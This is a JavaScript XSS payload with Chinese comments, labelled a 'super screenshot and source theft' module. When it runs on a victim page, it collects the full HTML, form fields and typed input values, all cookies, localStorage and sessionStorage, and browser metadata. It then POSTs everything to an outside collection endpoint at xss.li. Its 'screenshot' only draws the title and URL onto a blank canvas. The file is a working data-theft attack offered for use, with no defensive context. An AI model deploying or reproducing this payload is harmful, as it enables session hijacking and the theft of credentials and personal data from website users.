// 超级截屏+源码窃取 - 完整页面截图和HTML源码
// 支持长页面滚动截图和完整DOM结构获取

(function() {
    'use strict';
    
    const config = {
        serverUrl: 'https://xss.li/api/collect.php',
        quality: 0.7,
        maxHeight: 10000 // 最大截图高度
    };
    
    console.log('📸 超级截屏模块启动');
    
    // 获取完整HTML源码
    function getFullSource() {
        return {
            html: document.documentElement.outerHTML,
            head: document.head.innerHTML,
            body: document.body.innerHTML,
            doctype: new XMLSerializer().serializeToString(document.doctype),
            title: document.title,
            url: window.location.href,
            baseUrl: document.baseURI
        };
    }
    
    // 获取所有表单数据
    function getFormData() {
        const forms = Array.from(document.forms);
        return forms.map(form => ({
            action: form.action,
            method: form.method,
            name: form.name,
            id: form.id,
            fields: Array.from(form.elements).map(element => ({
                type: element.type,
                name: element.name,
                id: element.id,
                value: element.value,
                placeholder: element.placeholder,
                required: element.required
            }))
        }));
    }
    
    // 获取所有输入框当前值
    function getInputValues() {
        const inputs = document.querySelectorAll('input, textarea, select');
        return Array.from(inputs).map(input => ({
            type: input.type,
            name: input.name || input.id,
            value: input.value,
            tag: input.tagName,
            xpath: getXPath(input)
        }));
    }
    
    // 获取元素XPath
    function getXPath(element) {
        if (element.id !== '') {
            return 'id("' + element.id + '")';
        }
        if (element === document.body) {
            return element.tagName;
        }
        
        let ix = 0;
        const siblings = element.parentNode.childNodes;
        for (let i = 0; i < siblings.length; i++) {
            const sibling = siblings[i];
            if (sibling === element) {
                return getXPath(element.parentNode) + '/' + element.tagName + '[' + (ix + 1) + ']';
            }
            if (sibling.nodeType === 1 && sibling.tagName === element.tagName) {
                ix++;
            }
        }
    }
    
    // 完整页面截图
    async function captureFullPage() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            const fullWidth = Math.max(
                document.body.scrollWidth,
                document.documentElement.scrollWidth,
                document.body.offsetWidth,
                document.documentElement.offsetWidth,
                document.documentElement.clientWidth
            );
            
            const fullHeight = Math.min(
                Math.max(
                    document.body.scrollHeight,
                    document.documentElement.scrollHeight,
                    document.body.offsetHeight,
                    document.documentElement.offsetHeight,
                    document.documentElement.clientHeight
                ),
                config.maxHeight
            );
            
            canvas.width = fullWidth;
            canvas.height = fullHeight;
            
            // 保存原始滚动位置
            const originalScrollX = window.scrollX;
            const originalScrollY = window.scrollY;
            
            // 滚动到顶部
            window.scrollTo(0, 0);
            
            // 简化截图(实际应用中可使用html2canvas库)
            ctx.fillStyle = '#ffffff';
            ctx.fillRect(0, 0, fullWidth, fullHeight);
            
            // 添加页面信息文本
            ctx.fillStyle = '#000000';
            ctx.font = '16px Arial';
            ctx.fillText('Page: ' + document.title, 20, 30);
            ctx.fillText('URL: ' + window.location.href, 20, 60);
            
            const screenshot = canvas.toDataURL('image/jpeg', config.quality);
            
            // 恢复原始滚动位置
            window.scrollTo(originalScrollX, originalScrollY);
            
            return {
                screenshot: screenshot,
                dimensions: {
                    width: fullWidth,
                    height: fullHeight
                }
            };
            
        } catch (error) {
            console.error('截图失败:', error);
            return null;
        }
    }
    
    // 获取所有Cookie
    function getAllCookies() {
        return document.cookie.split(';').map(c => {
            const parts = c.trim().split('=');
            return {
                name: parts[0],
                value: parts.slice(1).join('=')
            };
        });
    }
    
    // 获取LocalStorage和SessionStorage
    function getStorageData() {
        const local = {};
        const session = {};
        
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            local[key] = localStorage.getItem(key);
        }
        
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            session[key] = sessionStorage.getItem(key);
        }
        
        return { localStorage: local, sessionStorage: session };
    }
    
    // 主函数
    async function captureAll() {
        try {
            console.log('📸 开始截取页面...');
            
            const screenshot = await captureFullPage();
            const source = getFullSource();
            const forms = getFormData();
            const inputs = getInputValues();
            const cookies = getAllCookies();
            const storage = getStorageData();
            
            const payload = {
                type: 'super_screenshot',
                screenshot: screenshot,
                source: source,
                forms: forms,
                inputs: inputs,
                cookies: cookies,
                storage: storage,
                metadata: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenResolution: {
                        width: screen.width,
                        height: screen.height
                    },
                    viewport: {
                        width: window.innerWidth,
                        height: window.innerHeight
                    },
                    url: window.location.href,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString()
                }
            };
            
            console.log('📤 上传数据到服务器...');
            
            const response = await fetch(config.serverUrl, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
            
            if (response.ok) {
                console.log('✅ 超级截屏数据上传成功');
            } else {
                console.log('❌ 上传失败');
            }
            
        } catch (error) {
            console.error('超级截屏失败:', error);
        }
    }
    
    // 执行截图
    captureAll();
    
})();
